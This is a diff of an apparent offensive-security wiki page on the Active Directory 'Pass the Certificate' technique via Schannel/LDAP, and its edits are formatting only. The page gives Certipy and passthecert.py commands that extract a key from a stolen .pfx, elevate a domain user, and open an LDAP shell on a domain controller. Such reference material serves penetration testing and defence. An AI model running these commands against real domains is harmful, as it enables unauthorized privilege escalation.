@@ -1,7 +1,7 @@
-# Pass The Certificate
+# Pass the Certificate
 
 {% hint style="warning" %}
-This technique extends the notion of [Pass the Certificate](../kerberos/pass-the-certificate.md), thus dubbed by [@_nwodtuhs](https://twitter.com/_nwodtuhs/) in his Twitter [thread on AD CS and PKINIT](https://twitter.com/_nwodtuhs/status/1451510341041594377). Even if both techniques share the same name and the same concept, the authentication method is different.
+This technique extends the notion of [Pass the Certificate](../kerberos/pass-the-certificate.md), thus dubbed by [@\_nwodtuhs](https://twitter.com/\_nwodtuhs/) in his Twitter [thread on AD CS and PKINIT](https://twitter.com/\_nwodtuhs/status/1451510341041594377). Even if both techniques share the same name and the same concept, the authentication method is different.
 {% endhint %}
 
 ## Theory
@@ -18,17 +18,18 @@ Sometimes, Domain Controllers do not support [PKINIT](../../kerberos/pass-the-ce
 {% tabs %}
 {% tab title="UNIX-like" %}
 Tools like [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) (python version) and [Certipy](https://github.com/ly4k/Certipy) can be used to authenticate with the certificate via Schannel against LDAP.
+
 ```bash
 # If you use Certipy to retrieve certificates, you can extract key and cert from the pfx by using:
 $ certipy cert -pfx user.pfx -nokey -out user.crt
 $ certipy cert -pfx user.pfx -nocert -out user.key
 
 # elevate a user (it assumes that the domain account for which the certificate was issued, holds privileges to elevate user)
-passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip 10.0.0.1 -target user_sam -elevate
+passthecert.py -action modify_user -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1" -target user_sam -elevate
 
 # spawn a LDAP shell
-passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip 10.0.0.1
-certipy auth -pfx -dc-ip 10.0.0.1 -ldap-shell
+passthecert.py -action ldap-shell -crt user.crt -key user.key -domain domain.local -dc-ip "10.0.0.1"
+certipy auth -pfx -dc-ip "10.0.0.1" -ldap-shell
 ```
 {% endtab %}
 
@@ -45,5 +46,7 @@ Pass the cert technique can be done with[PassTheCert](https://github.com/AlmondO
 ## Resources
 
 {% embed url="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" %}
+
 {% embed url="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf" %}
+
 {% embed url="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d" %}
